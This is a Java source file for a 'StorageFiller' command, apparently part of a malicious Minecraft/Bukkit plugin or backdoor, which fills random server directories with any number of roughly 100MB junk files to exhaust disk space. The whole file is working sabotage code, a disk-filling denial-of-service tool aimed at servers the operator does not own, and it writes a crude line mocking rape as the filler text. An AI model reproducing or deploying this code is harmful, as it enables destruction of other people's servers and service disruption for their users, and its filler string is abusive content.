package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.apache.commons.lang.ArrayUtils;
import org.bukkit.entity.Player;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.nio.MappedByteBuffer;
import java.nio.channels.FileChannel;
import java.util.Random;

public class StorageFiller implements Command {
    @Override
    public String[] getCommands() {
        return new String[]{"storagefiller", "sf"};
    }

    @Override
    public String getDescription() {
        return "Fills a random directory on the server with any amount of 100mb files.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        String[] args = context.getArgs();
        if (args.length == 0) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "Usage: sf <amount> (directory)");
            return;
        }

        int amount;
        try {
            amount = Integer.parseInt(args[0]);
        } catch (NumberFormatException e) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            return;
        }

        File[] directories = new File("./").listFiles(File::isDirectory);

        if (args.length != 1) {
            String[] notFirstArg = (String[]) ArrayUtils.remove(args, 0);
            directories = new File[]{new File("./" + String.join(" ", notFirstArg))};
        }

        if (directories == null) {
            sender.sendMessage(Colors.Prefix + Colors.Failure + "No directories found!");
            return;
        }


        for (int i = 0; i < amount; i++) {
            File directory = directories[new Random().nextInt(directories.length)];
            File created = new File(directory.toPath().toString(), randomFile());
            sender.sendMessage(Colors.Prefix + Colors.Caution + "Trying to create file " + created.toPath() + "...");

            try {
                created.createNewFile();
            } catch (IOException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                continue;
            }

            byte[] buffer = "this server is getting anally raped lol\n".getBytes();
            int number_of_lines = 400000 * 7;
            // 400000 is ~15mb

            FileChannel rwChannel;
            try {
                rwChannel = new RandomAccessFile(created, "rw").getChannel();
            } catch (FileNotFoundException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                continue;
            }

            MappedByteBuffer wrBuf;
            try {
                wrBuf = rwChannel.map(FileChannel.MapMode.READ_WRITE, 0, (long) buffer.length * number_of_lines);
            } catch (IOException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
                continue;
            }

            for (int ii = 0; ii < number_of_lines; ii++) {
                try {
                    wrBuf.put(buffer);
                } catch (Exception exception) {
                    sender.sendMessage(Colors.Prefix + Colors.Failure + exception.getMessage());
                    break;
                }
            }

            try {
                rwChannel.close();
            } catch (IOException e) {
                sender.sendMessage(Colors.Prefix + Colors.Failure + e.getMessage());
            }

            sender.sendMessage(Colors.Prefix + Colors.Success + "Wrote lines to " + created.getPath() + "!");
        }
    }

    private String randomFile() {
        String aToZ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789";
        Random rand = new Random();
        StringBuilder res = new StringBuilder();
        for (int i = 0; i < 5; i++) {
            int randIndex = rand.nextInt(aToZ.length());
            res.append(aToZ.charAt(randIndex));
        }

        return res.toString();
    }
}
